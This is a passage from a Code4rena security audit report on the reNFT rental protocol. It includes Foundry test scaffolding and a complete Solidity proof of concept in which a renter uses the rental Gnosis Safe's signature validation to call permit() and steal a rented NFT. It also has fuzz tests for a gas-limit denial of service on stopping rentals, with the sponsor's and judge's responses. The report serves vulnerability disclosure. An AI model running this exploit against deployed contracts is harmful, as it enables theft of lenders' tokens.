                RentalItemType itemType = _seaportItemTypeToRentalItemType(
                    considerationItem.itemType
                );

                // determine which entity the payment will settle to
                SettleTo settleTo = metadata.orderType == OrderType.PAYEE &&
                    considerationItem.itemType == SeaportItemType.ERC20
                    ? SettleTo.RENTER
                    : SettleTo.LENDER;

                // calculate item index offset
                uint256 itemIndex = i + parameters.offer.length;

                // create a new payment item
                rentalOrder.items[itemIndex] = Item({
                    itemType: itemType,
                    settleTo: settleTo,
                    token: considerationItem.token,
                    amount: considerationItem.startAmount,
                    identifier: considerationItem.identifierOrCriteria
                });
            }
        }

        function _signProtocolOrder(
            uint256 signerPrivateKey,
            bytes32 payloadHash
        ) internal view returns (bytes memory signature) {
            // fetch domain separator from create policy
            bytes32 domainSeparator = create.domainSeparator();

            // sign the EIP-712 digest
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(
                signerPrivateKey,
                domainSeparator.toTypedDataHash(payloadHash)
            );

            // encode the signature
            signature = abi.encodePacked(r, s, v);
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                            Fulfillment Amendments                           //
        /////////////////////////////////////////////////////////////////////////////////

        function withFulfiller(ProtocolAccount memory _fulfiller) internal {
            fulfiller = _fulfiller;
        }

        function withRecipient(address _recipient) internal {
            seaportRecipient = _recipient;
        }

        function withAdvancedOrder(
            AdvancedOrder memory _advancedOrder,
            uint256 orderIndex
        ) internal {
            // get a storage pointer to the order to fulfill
            OrderToFulfill storage orderToFulfill = ordersToFulfill[orderIndex];

            // set the new advanced order
            _createAdvancedOrder(orderToFulfill.advancedOrder, _advancedOrder);
        }

        function withSeaportMatchOrderFulfillment(Fulfillment memory _fulfillment) internal {
            // get a pointer to a new seaport fulfillment
            Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();

            // set the fulfillment
            _createSeaportFulfillment(
                fulfillment,
                Fulfillment({
                    offerComponents: _fulfillment.offerComponents,
                    considerationComponents: _fulfillment.considerationComponents
                })
            );
        }

        function withSeaportMatchOrderFulfillments(
            Fulfillment[] memory fulfillments
        ) internal {
            // reset all current seaport match order fulfillments
            resetSeaportMatchOrderFulfillments();

            // add the new offer items to storage
            for (uint256 i = 0; i < fulfillments.length; i++) {
                // get a pointer to a new seaport fulfillment
                Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();

                // set the fulfillment
                _createSeaportFulfillment(
                    fulfillment,
                    Fulfillment({
                        offerComponents: fulfillments[i].offerComponents,
                        considerationComponents: fulfillments[i].considerationComponents
                    })
                );
            }
        }

        function withBaseOrderFulfillmentComponents() internal {
            // create offer fulfillments. We need to specify which offer items can be aggregated
            // into one transaction. For example, 2 different orders where the same seller is offering
            // the same item in each.
            //
            // Since BASE orders will only contain ERC721 offer items, these cannot be aggregated. So, a separate fulfillment
            // is created for each order.
            for (uint256 i = 0; i < ordersToFulfill.length; i++) {
                // get a pointer to a new offer fulfillment array. This array will contain indexes of
                // orders and items which are all grouped on whether they can be combined in a single transferFrom()
                FulfillmentComponent[] storage offerFulfillments = seaportOfferFulfillments
                    .push();

                // number of offer items in the order
                uint256 offerItemsInOrder = ordersToFulfill[i]
                    .advancedOrder
                    .parameters
                    .offer
                    .length;

                // add a single fulfillment component for each offer item in the order
                for (uint256 j = 0; j < offerItemsInOrder; j++) {
                    offerFulfillments.push(
                        FulfillmentComponent({orderIndex: i, itemIndex: j})
                    );
                }
            }

            // create consideration fulfillments. We need to specify which consideration items can be aggregated
            // into one transaction. For example, 3 different orders where the same fungible consideration items are
            // expected in return.
            //
            // get a pointer to a new offer fulfillment array. This array will contain indexes of
            // orders and items which are all grouped on whether they can be combined in a single transferFrom()
            FulfillmentComponent[]
                storage considerationFulfillments = seaportConsiderationFulfillments.push();

            // BASE orders will only contain ERC20 items, these are fungible and are candidates for aggregation. Because
            // all of these BASE orders will be fulfilled by the same EOA, and all ERC20 consideration items are going to the
            // ESCRW contract, the consideration items can be aggregated. In other words, Seaport will only make a single transfer
            // of ERC20 tokens from the fulfiller EOA to the payment escrow contract.
            //
            // put all fulfillments into one which can be an aggregated transfer
            for (uint256 i = 0; i < ordersToFulfill.length; i++) {
                considerationFulfillments.push(
                    FulfillmentComponent({orderIndex: i, itemIndex: 0})
                );
            }
        }

        function withLinkedPayAndPayeeOrders(
            uint256 payOrderIndex,
            uint256 payeeOrderIndex
        ) internal {
            // get the PAYEE order
            OrderParameters memory payeeOrder = ordersToFulfill[payeeOrderIndex]
                .advancedOrder
                .parameters;

            // For each consideration item in the PAYEE order, a fulfillment should be
            // constructed with a corresponding item from the PAY order's offer items.
            for (uint256 i = 0; i < payeeOrder.consideration.length; ++i) {
                // define the offer components
                FulfillmentComponent[] memory offerComponents = new FulfillmentComponent[](1);
                offerComponents[0] = FulfillmentComponent({
                    orderIndex: payOrderIndex,
                    itemIndex: i
                });

                // define the consideration components
                FulfillmentComponent[]
                    memory considerationComponents = new FulfillmentComponent[](1);
                considerationComponents[0] = FulfillmentComponent({
                    orderIndex: payeeOrderIndex,
                    itemIndex: i
                });

                // get a pointer to a new seaport fulfillment
                Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();

                // set the fulfillment
                _createSeaportFulfillment(
                    fulfillment,
                    Fulfillment({
                        offerComponents: offerComponents,
                        considerationComponents: considerationComponents
                    })
                );
            }
        }

        function resetFulfiller() internal {
            delete fulfiller;
        }

        function resetOrdersToFulfill() internal {
            delete ordersToFulfill;
        }

        function resetSeaportMatchOrderFulfillments() internal {
            delete seaportMatchOrderFulfillments;
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                           Fulfillment Finalization                          //
        /////////////////////////////////////////////////////////////////////////////////

        function _finalizePayOrderFulfillment(
            bytes memory expectedError
        )
            private
            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)
        {
            // get the orders to fulfill
            OrderToFulfill memory payOrder = ordersToFulfill[0];
            OrderToFulfill memory payeeOrder = ordersToFulfill[1];

            // create rental orders
            payRentalOrder = _createRentalOrder(payOrder);
            payeeRentalOrder = _createRentalOrder(payeeOrder);

            // expect an error if error data was provided
            if (expectedError.length != 0) {
                vm.expectRevert(expectedError);
            }
            // otherwise, expect the relevant event to be emitted.
            else {
                vm.expectEmit({emitter: address(create)});
                emit Events.RentalOrderStarted(
                    create.getRentalOrderHash(payRentalOrder),
                    payOrder.payload.metadata.emittedExtraData,
                    payRentalOrder.seaportOrderHash,
                    payRentalOrder.items,
                    payRentalOrder.hooks,
                    payRentalOrder.orderType,
                    payRentalOrder.lender,
                    payRentalOrder.renter,
                    payRentalOrder.rentalWallet,
                    payRentalOrder.startTimestamp,
                    payRentalOrder.endTimestamp
                );
            }

            // the offerer of the PAYEE order fulfills the orders.
            vm.prank(fulfiller.addr);

            // fulfill the orders
            seaport.matchAdvancedOrders(
                _deconstructOrdersToFulfill(),
                new CriteriaResolver[](0),
                seaportMatchOrderFulfillments,
                seaportRecipient
            );

            // clear structs
            resetFulfiller();
            resetOrdersToFulfill();
            resetSeaportMatchOrderFulfillments();
        }

        function finalizePayOrderFulfillment()
            internal
            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)
        {
            (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(bytes(""));
        }

        function finalizePayOrderFulfillmentWithError(
            bytes memory expectedError
        )
            internal
            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)
        {
            (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(expectedError);
        }

        function _finalizeBaseOrderFulfillment(
            bytes memory expectedError
        ) private returns (RentalOrder memory rentalOrder) {
            // get the order to fulfill
            OrderToFulfill memory baseOrder = ordersToFulfill[0];

            // create a rental order
            rentalOrder = _createRentalOrder(baseOrder);

            // expect an error if error data was provided
            if (expectedError.length != 0) {
                vm.expectRevert(expectedError);
            }
            // otherwise, expect the relevant event to be emitted.
            else {
                vm.expectEmit({emitter: address(create)});
                emit Events.RentalOrderStarted(
                    create.getRentalOrderHash(rentalOrder),
                    baseOrder.payload.metadata.emittedExtraData,
                    rentalOrder.seaportOrderHash,
                    rentalOrder.items,
                    rentalOrder.hooks,
                    rentalOrder.orderType,
                    rentalOrder.lender,
                    rentalOrder.renter,
                    rentalOrder.rentalWallet,
                    rentalOrder.startTimestamp,
                    rentalOrder.endTimestamp
                );
            }

            // the owner of the rental wallet fulfills the advanced order, and marks the rental wallet
            // as the recipient
            vm.prank(fulfiller.addr);
            seaport.fulfillAdvancedOrder(
                baseOrder.advancedOrder,
                new CriteriaResolver[](0),
                conduitKey,
                seaportRecipient
            );

            // clear structs
            resetFulfiller();
            resetOrdersToFulfill();
            resetSeaportMatchOrderFulfillments();
        }

        function finalizeBaseOrderFulfillment()
            internal
            returns (RentalOrder memory rentalOrder)
        {
            rentalOrder = _finalizeBaseOrderFulfillment(bytes(""));
        }

        function finalizeBaseOrderFulfillmentWithError(
            bytes memory expectedError
        ) internal returns (RentalOrder memory rentalOrder) {
            rentalOrder = _finalizeBaseOrderFulfillment(expectedError);
        }

        function finalizeBaseOrdersFulfillment()
            internal
            returns (RentalOrder[] memory rentalOrders)
        {
            // Instantiate rental orders
            uint256 numOrdersToFulfill = ordersToFulfill.length;
            rentalOrders = new RentalOrder[](numOrdersToFulfill);

            // convert each order to fulfill into a rental order
            for (uint256 i = 0; i < numOrdersToFulfill; i++) {
                rentalOrders[i] = _createRentalOrder(ordersToFulfill[i]);
            }

            // Expect the relevant events to be emitted.
            for (uint256 i = 0; i < rentalOrders.length; i++) {
                vm.expectEmit({emitter: address(create)});
                emit Events.RentalOrderStarted(
                    create.getRentalOrderHash(rentalOrders[i]),
                    ordersToFulfill[i].payload.metadata.emittedExtraData,
                    rentalOrders[i].seaportOrderHash,
                    rentalOrders[i].items,
                    rentalOrders[i].hooks,
                    rentalOrders[i].orderType,
                    rentalOrders[i].lender,
                    rentalOrders[i].renter,
                    rentalOrders[i].rentalWallet,
                    rentalOrders[i].startTimestamp,
                    rentalOrders[i].endTimestamp
                );
            }

            // the owner of the rental wallet fulfills the advanced orders, and marks the rental wallet
            // as the recipient
            vm.prank(fulfiller.addr);
            seaport.fulfillAvailableAdvancedOrders(
                _deconstructOrdersToFulfill(),
                new CriteriaResolver[](0),
                seaportOfferFulfillments,
                seaportConsiderationFulfillments,
                conduitKey,
                seaportRecipient,
                ordersToFulfill.length
            );

            // clear structs
            resetFulfiller();
            resetOrdersToFulfill();
            resetSeaportMatchOrderFulfillments();
        }

        function finalizePayOrdersFulfillment()
            internal
            returns (RentalOrder[] memory rentalOrders)
        {
            // Instantiate rental orders
            uint256 numOrdersToFulfill = ordersToFulfill.length;
            rentalOrders = new RentalOrder[](numOrdersToFulfill);

            // convert each order to fulfill into a rental order
            for (uint256 i = 0; i < numOrdersToFulfill; i++) {
                rentalOrders[i] = _createRentalOrder(ordersToFulfill[i]);
            }

            // Expect the relevant events to be emitted.
            for (uint256 i = 0; i < rentalOrders.length; i++) {
                // only expect the event if its a PAY order
                if (ordersToFulfill[i].payload.metadata.orderType == OrderType.PAY) {
                    vm.expectEmit({emitter: address(create)});
                    emit Events.RentalOrderStarted(
                        create.getRentalOrderHash(rentalOrders[i]),
                        ordersToFulfill[i].payload.metadata.emittedExtraData,
                        rentalOrders[i].seaportOrderHash,
                        rentalOrders[i].items,
                        rentalOrders[i].hooks,
                        rentalOrders[i].orderType,
                        rentalOrders[i].lender,
                        rentalOrders[i].renter,
                        rentalOrders[i].rentalWallet,
                        rentalOrders[i].startTimestamp,
                        rentalOrders[i].endTimestamp
                    );
                }
            }

            // the offerer of the PAYEE order fulfills the orders. For this order, it shouldn't matter
            // what the recipient address is
            vm.prank(fulfiller.addr);
            seaport.matchAdvancedOrders(
                _deconstructOrdersToFulfill(),
                new CriteriaResolver[](0),
                seaportMatchOrderFulfillments,
                seaportRecipient
            );

            // clear structs
            resetFulfiller();
            resetOrdersToFulfill();
            resetSeaportMatchOrderFulfillments();
        }

        function _deconstructOrdersToFulfill()
            private
            view
            returns (AdvancedOrder[] memory advancedOrders)
        {
            // get the length of the orders to fulfill
            advancedOrders = new AdvancedOrder[](ordersToFulfill.length);

            // build up the advanced orders
            for (uint256 i = 0; i < ordersToFulfill.length; i++) {
                advancedOrders[i] = ordersToFulfill[i].advancedOrder;
            }
        }
    }

    contract SetupReNFT is OrderFulfiller {}

</details>

<details>
<summary><b>Exploit.sol</b></summary>
<br>

    // SPDX-License-Identifier: BUSL-1.1
    pragma solidity ^0.8.20;

    import {
        Order,
        FulfillmentComponent,
        Fulfillment,
        ItemType as SeaportItemType,
        OfferItem,
        ItemType
    } from "@seaport-types/lib/ConsiderationStructs.sol";

    import {OfferItemLib} from "@seaport-sol/SeaportSol.sol";

    import {OrderType, OrderMetadata, RentalOrder} from "@src/libraries/RentalStructs.sol";

    import {ERC721} from '@openzeppelin-contracts/token/ERC721/ERC721.sol';
    import {IERC721} from '@openzeppelin-contracts/token/ERC721/IERC721.sol';
    import {Ownable} from "@openzeppelin-contracts/access/Ownable.sol";

    import {SetupReNFT} from "./SetupExploit.sol";
    import {Assertions} from "@test/utils/Assertions.sol";
    import {Constants} from "@test/utils/Constants.sol";
    import {SafeUtils} from "@test/utils/GnosisSafeUtils.sol";
    import {Enum} from "@safe-contracts/common/Enum.sol";

    import "forge-std/console.sol";



    contract Exploit is SetupReNFT, Assertions, Constants {

        using OfferItemLib for OfferItem;

        function test_NFT_Permit_Exploit() public {

            NFTWithPermit permitNFT = new NFTWithPermit();

            // The NFT token which Alice, the lender, will offer.
            permitNFT.safeMint(alice.addr, 1);

            // Approve seaport conduit to spend the token.
            vm.prank(alice.addr);
            permitNFT.approve(address(conduit), 1);

            /////////////////////////////////////////////
            // Order Creation & Fulfillment simulation //
            /////////////////////////////////////////////

            // Alice creates a BASE order
            createOrder({
                offerer: alice,
                orderType: OrderType.BASE,
                erc721Offers: 1,
                erc1155Offers: 0,
                erc20Offers: 0,
                erc721Considerations: 0,
                erc1155Considerations: 0,
                erc20Considerations: 1
            });

            // Remove the pre-inserted offer item (which is inserted by the tests)
            popOfferItem();

            // Set the NFT which we created as the offer item
            withOfferItem(
                    OfferItemLib
                        .empty()
                        .withItemType(ItemType.ERC721)
                        .withToken(address(permitNFT))
                        .withIdentifierOrCriteria(1)
                        .withStartAmount(1)
                        .withEndAmount(1)
            );

            // Finalize the order creation
            (
                Order memory order,
                bytes32 orderHash,
                OrderMetadata memory metadata
            ) = finalizeOrder();
            

            // Create an order fulfillment
            createOrderFulfillment({
                _fulfiller: attacker,
                order: order,
                orderHash: orderHash,
                metadata: metadata
            });

            // Finalize the base order fulfillment
            RentalOrder memory rentalOrder = finalizeBaseOrderFulfillment();

            // get the rental order hash
            bytes32 rentalOrderHash = create.getRentalOrderHash(rentalOrder);

            // assert that the rental order was stored
            assertEq(STORE.orders(rentalOrderHash), true);

            // assert that the token is in storage
            assertEq(STORE.isRentedOut(address(attacker.safe), address(permitNFT), 1), true);

            // assert that the ERC1155 is in the rental wallet of the fulfiller
            assertEq(permitNFT.balanceOf(address(attacker.safe)), 1);


            /** ------------------- Exploitation ------------------- */

            // Impersonate the attacker
            vm.startPrank(attacker.addr);

            // The digest which will be hashed by gnosis then signed by the attacker (owner of the safe).
            // The format of this digest is taken from the `permit()` function.
            bytes memory digest = bytes.concat(
                keccak256(
                    abi.encodePacked(
                        '\x19\x01',
                        permitNFT.DOMAIN_SEPARATOR(),
                        keccak256(
                            abi.encode(
                                permitNFT.PERMIT_TYPEHASH(), 
                                attacker.addr, // spender
                                1, // the token Id
                                permitNFT.tokenIdNonces(1), // get the nonce for the token ID "1"
                                block.timestamp + 10000000 // deadline until which, the call to `permit()` with this signature will be allowed.
                            )
                        )
                    )
                )
            );        
            
            // Get the message hash for the digest.
            bytes32 msgHash = fallbackHandler.getMessageHashForSafe(attacker.safe, digest);

            // Sign the hashed message and get the signature (r, s, v).
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(attacker.privateKey, msgHash);


            // The call to `permit()` -> (address spender, uint256 tokenId, uint256 deadline, v, r, s)
            bytes memory transaction = abi.encodeWithSelector(
                ERC721Permit.permit.selector,
                attacker.addr, // The address of the attacker
                1, // The token ID to hijack
                block.timestamp + 10000000, // the deadline
                v,
                r,
                s
            );

            // Sign the transaction to be sent to gnosis
            bytes memory transactionSignature = SafeUtils.signTransaction(
                address(attacker.safe),
                attacker.privateKey,
                address(permitNFT),
                transaction
            );


            // Execute the transaction
            SafeUtils.executeTransaction(
                address(attacker.safe),
                address(permitNFT),
                transaction,
                transactionSignature
            );

            // Transfer the NFT from the attacker's safe to the attacker's address. This is the final stage of the exploit
            permitNFT.transferFrom(address(attacker.safe), address(attacker.addr), 1);

            vm.stopPrank();

            /** -------------- Final checks -------------- */

            uint256 attackersBalance = permitNFT.balanceOf(address(attacker.addr));
            uint256 attackersSafeBalance = permitNFT.balanceOf(address(attacker.safe));

            if (attackersSafeBalance == 0 && attackersBalance == 1) {
                console.log("Tokens successfully hijacked from the attacker's (borrower) safe!");
            }

        }

    }





    // Serves as a replacement for openzeppelin's `isContract` function which `ERC721Permit` relies on, simply because the currently installed openzeppelin version (5.0) for this PoC setup no longer includes the function `isContract` in the `Address` library.
    library Address {
        function isContract(address account) internal view returns (bool) {
            // This method relies on extcodesize, which returns 0 for contracts in
            // construction, since the code is only stored at the end of the
            // constructor execution.

            uint256 size;
            assembly {
                size := extcodesize(account)
            }
            return size > 0;
        }
    }

    // Source: https://github.com/Uniswap/v3-periphery/blob/main/contracts/libraries/ChainId.sol
    /// @title Function for getting the current chain ID
    library ChainId {
        /// @dev Gets the current chain ID
        /// @return chainId The current chain ID
        function get() internal view returns (uint256 chainId) {
            assembly {
                chainId := chainid()
            }
        }
    }

    // Source: https://github.com/Uniswap/v3-periphery/blob/main/contracts/interfaces/external/IERC1271.sol
    /// @title Interface for verifying contract-based account signatures
    /// @notice Interface that verifies provided signature for the data
    /// @dev Interface defined by EIP-1271
    interface IERC1271 {
        /// @notice Returns whether the provided signature is valid for the provided data
        /// @dev MUST return the bytes4 magic value 0x1626ba7e when function passes.
        /// MUST NOT modify state (using STATICCALL for solc < 0.5, view modifier for solc > 0.5).
        /// MUST allow external calls.
        /// @param hash Hash of the data to be signed
        /// @param signature Signature byte array associated with _data
        /// @return magicValue The bytes4 magic value 0x1626ba7e
        function isValidSignature(bytes32 hash, bytes memory signature) external view returns (bytes4 magicValue);
    }

    /// @title ERC721 with permit
    /// @notice Extension to ERC721 that includes a permit function for signature based approvals
    interface IERC721Permit is IERC721 {
        /// @notice The permit typehash used in the permit signature
        /// @return The typehash for the permit
        function PERMIT_TYPEHASH() external pure returns (bytes32);

        /// @notice The domain separator used in the permit signature
        /// @return The domain seperator used in encoding of permit signature
        function DOMAIN_SEPARATOR() external view returns (bytes32);

        /// @notice Approve of a specific token ID for spending by spender via signature
        /// @param spender The account that is being approved
        /// @param tokenId The ID of the token that is being approved for spending
        /// @param deadline The deadline timestamp by which the call must be mined for the approve to work
        /// @param v Must produce valid secp256k1 signature from the holder along with `r` and `s`
        /// @param r Must produce valid secp256k1 signature from the holder along with `v` and `s`
        /// @param s Must produce valid secp256k1 signature from the holder along with `r` and `v`
        function permit(
            address spender,
            uint256 tokenId,
            uint256 deadline,
            uint8 v,
            bytes32 r,
            bytes32 s
        ) external payable;
    }

    // Source: https://github.com/Uniswap/v3-periphery/blob/main/contracts/base/ERC721Permit.sol
    /// @title ERC721 with permit
    /// @notice Nonfungible tokens that support an approve via signature, i.e. permit
    abstract contract ERC721Permit is ERC721, IERC721Permit {
        /// @dev Gets the current nonce for a token ID and then increments it, returning the original value
        function _getAndIncrementNonce(uint256 tokenId) internal virtual returns (uint256);

        /// @dev The hash of the name used in the permit signature verification
        bytes32 private immutable nameHash;

        /// @dev The hash of the version string used in the permit signature verification
        bytes32 private immutable versionHash;

        /// @notice Computes the nameHash and versionHash
        constructor(
            string memory name_,
            string memory symbol_,
            string memory version_
        ) ERC721(name_, symbol_) {
            nameHash = keccak256(bytes(name_));
            versionHash = keccak256(bytes(version_));
        }

        /// @inheritdoc IERC721Permit
        function DOMAIN_SEPARATOR() public view override returns (bytes32) {
            return
                keccak256(
                    abi.encode(
                        // keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)')
                        0x8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f,
                        nameHash,
                        versionHash,
                        ChainId.get(),
                        address(this)
                    )
                );
        }

        /// @inheritdoc IERC721Permit
        /// @dev Value is equal to keccak256("Permit(address spender,uint256 tokenId,uint256 nonce,uint256 deadline)");
        bytes32 public constant override PERMIT_TYPEHASH =
            0x49ecf333e5b8c95c40fdafc95c1ad136e8914a8fb55e9dc8bb01eaa83a2df9ad;

        /// @inheritdoc IERC721Permit
        function permit(
            address spender,
            uint256 tokenId,
            uint256 deadline,
            uint8 v,
            bytes32 r,
            bytes32 s
        ) external payable override {
            require(block.timestamp <= deadline, 'Permit expired');

            bytes32 digest =
                keccak256(
                    abi.encodePacked(
                        '\x19\x01',
                        DOMAIN_SEPARATOR(),
                        keccak256(abi.encode(PERMIT_TYPEHASH, spender, tokenId, _getAndIncrementNonce(tokenId), deadline))
                    )
                );
            address owner = ownerOf(tokenId);
            require(spender != owner, 'ERC721Permit: approval to current owner');

            if (Address.isContract(owner)) {
                require(IERC1271(owner).isValidSignature(digest, abi.encodePacked(r, s, v)) == 0x1626ba7e, 'Unauthorized');
            } else {
                address recoveredAddress = ecrecover(digest, v, r, s);
                require(recoveredAddress != address(0), 'Invalid signature');
                require(recoveredAddress == owner, 'Unauthorized');
            }

            _approve(spender, tokenId);
        }
    }


    contract NFTWithPermit is ERC721, ERC721Permit, Ownable {
        
        mapping(uint256 tokenId => uint256 nonce) public tokenIdNonces;

        constructor() ERC721Permit("MyNFT", "MNFT", "1.1") Ownable(msg.sender) {}

        function _getAndIncrementNonce(uint256 tokenId) internal override returns (uint256) {

            uint256 tokenIdNonce = tokenIdNonces[tokenId];

            tokenIdNonces[tokenId] += 1;

            return tokenIdNonce;
        }

        function safeMint(address to, uint256 tokenId) public onlyOwner {
            _safeMint(to, tokenId);
        }

    }

</details>

***

### Impact

***

This allows an attacker to hijack any NFT implementing the `permit()` function.

***

### Remediation

***

One way to remediate this is to add a check in the [`FallbackManager.sol`](https://github.com/safe-global/safe-contracts/blob/main/contracts/base/FallbackManager.sol) contract in the gnosis safe contracts. This check should check if the function selector is equivalent to `isValidSignature(bytes32,bytes)` and the `msg.sender` is an address of a NFT token that is rented in the reNFT protocol.

**[Alec1017 (reNFT) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/587#issuecomment-1910740999):**
 > Non-standard ERC implementations were considered out of scope, but regardless we do plan on adding a whitelist for tokens interacting with the protocol.

**[0xean (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/587#issuecomment-1912630065):**
 > While the permit functionality is not part of the specification for ERC 721 (nor ERC20) I don't think it would be reasonable to call this out of scope.  I do think that its a pre-condition for this attack and therefore might be better classified as M severity. Would welcome more conversation if the sponsor disagrees strongly, but think this is a valid issue that isn't a "gotcha" like some of the other odd ERC20 token exploits. 

**[Alec1017 (reNFT) acknowledged](https://github.com/code-423n4/2024-01-renft-findings/issues/587#issuecomment-1910740837)**

_Note: To see full discussion, see [here](https://github.com/code-423n4/2024-01-renft-findings/issues/587)._

**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**
> The PR [here](https://github.com/re-nft/smart-contracts/pull/11) - Introduces support for rented tokens that use Permit() for gasless approvals. The rental safe should now be able to prevent gasless signatures from approving rented assets.

**Status:** Mitigation error. Full details in reports from [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/26) and [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/10), and also included in the [Mitigation Review](#mitigation-review) section below.

***

## [[M-03] Risk of DoS when stoping large rental orders due to block gas limit](https://github.com/code-423n4/2024-01-renft-findings/issues/538)
*Submitted by [plasmablocks](https://github.com/code-423n4/2024-01-renft-findings/issues/538), also found by [serial-coder](https://github.com/code-423n4/2024-01-renft-findings/issues/544), [0xabhay](https://github.com/code-423n4/2024-01-renft-findings/issues/309), [BARW](https://github.com/code-423n4/2024-01-renft-findings/issues/283), and [hals](https://github.com/code-423n4/2024-01-renft-findings/issues/349)*

When an order is created on Opensea the `Create::validateOrder()` policy method is used to ensure the order is configured correctly. Currently there is no maximum limit to the number of `offers` in the input `ZoneParameters`, which allows orders to contain an arbitrary amount of ERC-721 and ERC-1155 items to a rental order.

If a large enough rental order is successfully created, there is a risk that it won't be able to be stopped by calling the `Stop::stopRent()` due to the amount of gas required exceeding the block gas limit. This would prevent the escrow from settling the order and leave the order permantanly in a rental state. This also means any ERC-721 and ERC-1155 tokens in the order would not be able to be reclaimed.

This situation arises under the following conditions:

*   The call to stop a rental order uses more gas than the call to create a rental order
*   The call to create the rental order is successful
*   The call to stop a rental order uses more gas than the block gas limit

### Proof of Concept

Below I have written 2 proof of concepts to show the above conditions are possible. Each of these can be added to `StopRent.t.sol` to run.

<Details>

```solidity
    // Update the `setup` in AccountCreator to 2000+ tokens on deployToken
    function testFuzz_StopRent_PayOrder_More_Expensive_To_Stop_Than_Start(uint numOf721, uint numof1155) public {
        numOf721 = bound(numOf721, 400, erc721s.length);
        numof1155 = bound(numof1155, 400, erc1155s.length);

        uint numOfERC20 = erc1155s.length % 30;
        // create a Alice BASE order
        createOrder({
            offerer: alice,
            orderType: OrderType.BASE,
            erc721Offers: numOf721,
            erc1155Offers: numof1155,
            erc20Offers: 0,
            erc721Considerations: 0,
            erc1155Considerations: 0,
            erc20Considerations: numOfERC20
        });

        (
            Order memory orderOne,
            bytes32 orderHashOne,
            OrderMetadata memory metadataOne
        ) = finalizeOrder();

        createOrderFulfillment({
            _fulfiller: bob,
            order: orderOne,
            orderHash: orderHashOne,
            metadata: metadataOne
        });

        uint initialGasLeft = gasleft();

        // finalize the base order fulfillment
        RentalOrder memory rentalOrderOne = finalizeBaseOrderFulfillment();
        
        uint totalGasForOrder = initialGasLeft - gasleft();

        // speed up in time past the rental expiration
        vm.warp(block.timestamp + 750);


        // stop the rental order and steal carols nft
        vm.prank(alice.addr);
        uint remaininggInitial = gasleft();
        stop.stopRent(rentalOrderOne);

        uint finalGasLeft = gasleft();
        uint gasForStopingRent = remaininggInitial - finalGasLeft;
        
        assert(totalGasForOrder > gasForStopingRent);
    }

    // Update the `setup` in AccountCreator to 2000+ tokens on deployToken
    function testFuzz_StopRent_PayOrder_StopRent_Hit_Block_GasLimit(uint numOf721, uint numof1155) public {
        numOf721 = bound(numOf721, 1500, erc721s.length);
        numof1155 = bound(numof1155, 1500, erc1155s.length);

        uint numOfERC20 = erc1155s.length % 30;
        // create a Alice BASE order
        createOrder({
            offerer: alice,
            orderType: OrderType.BASE,
            erc721Offers: numOf721,
            erc1155Offers: numof1155,
            erc20Offers: 0,
            erc721Considerations: 0,
            erc1155Considerations: 0,
            erc20Considerations: numOfERC20
        });

        (
            Order memory orderOne,
            bytes32 orderHashOne,
            OrderMetadata memory metadataOne
        ) = finalizeOrder();

        createOrderFulfillment({
            _fulfiller: bob,
            order: orderOne,
            orderHash: orderHashOne,
            metadata: metadataOne
        });

        uint initialGasLeft = gasleft();

        // finalize the base order fulfillment
        RentalOrder memory rentalOrderOne = finalizeBaseOrderFulfillment();
        
        uint totalGasForOrder = initialGasLeft - gasleft();

        // speed up in time past the rental expiration
        vm.warp(block.timestamp + 750);


        // stop the rental order and steal carols nft
        vm.prank(alice.addr);
        uint remaininggInitial = gasleft();
        stop.stopRent(rentalOrderOne);

        uint finalGasLeft = gasleft();
        uint gasForStopingRent = remaininggInitial - finalGasLeft;

        // finalize the order creation
        // block gaslimit for ETH: https://ycharts.com/indicators/ethereum_average_gas_limit
        uint GAS_LIMIT = 30000000 wei;
        
        assert(gasForStopingRent < GAS_LIMIT);
    }

```

</details>

### Tools Used

Foundry

### Recommended Mitigation Steps

Limit the number of offers that an order can contain (to a value such as 500 or 1000) to ensure that stopping rentals doesn't exceed the blocks gas limit. One way to do this is to enforce a maximum number of `SpentItem[] offer` and fail to create the order if it is exceeded.

**[Alec1017 (reNFT) acknowledged](https://github.com/code-423n4/2024-01-renft-findings/issues/538#issuecomment-1915640715)**

_Note: To see full discussion, see [here](https://github.com/code-423n4/2024-01-renft-findings/issues/538)._

***

## [[M-04] DoS of Rental stopping mechanism](https://github.com/code-423n4/2024-01-renft-findings/issues/501)
